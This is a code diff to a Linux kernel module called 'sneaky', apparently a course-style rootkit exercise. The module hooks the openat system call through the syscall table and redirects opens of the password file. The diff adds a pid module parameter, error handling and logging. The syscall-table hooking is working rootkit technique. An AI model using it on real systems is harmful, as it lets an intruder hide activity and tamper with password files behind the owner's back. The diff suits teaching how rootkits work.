@@ -8,6 +8,7 @@
 #include <linux/kallsyms.h>
 #include <linux/uaccess.h>
 #include <linux/string.h>
+#include <linux/moduleparam.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
@@ -17,6 +18,9 @@
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
+static int sneaky_pid;
+
+module_param(sneaky_pid, int, 0);
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -50,8 +54,13 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
                                   sizeof(pathname));
 
   if (copied > 0 && strcmp(pathname, PASSWD_PATH) == 0) {
-    copy_to_user((void __user *)regs->si, redirected_path,
-                 sizeof(redirected_path));
+    unsigned long not_copied =
+        copy_to_user((void __user *)regs->si, redirected_path,
+                     sizeof(redirected_path));
+
+    if (not_copied != 0) {
+      return (*original_openat)(regs);
+    }
   }
 
   return (*original_openat)(regs);
@@ -62,6 +71,7 @@ static int initialize_sneaky_module(void)
 {
   // See /var/log/syslog or use `dmesg` for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "Sneaky module pid = %d\n", sneaky_pid);
 
   // Lookup the address for this symbol. Returns 0 if not found.
   // This address will change after rebooting due to protection
